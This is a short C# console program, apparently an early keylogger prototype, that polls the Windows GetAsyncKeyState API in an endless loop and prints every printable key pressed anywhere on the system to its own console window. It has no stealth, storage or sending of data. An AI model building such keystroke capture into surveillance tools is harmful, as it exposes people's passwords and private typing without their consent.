using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConsoleApp6
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public string keylog = "";
        static void Main(string[] args)
        {
            while (true) {
                //check state of all keys
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++) {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767){
                        Console.Write((char)i + ", ");
                    }
                  
                }
            }
        }
    }
}
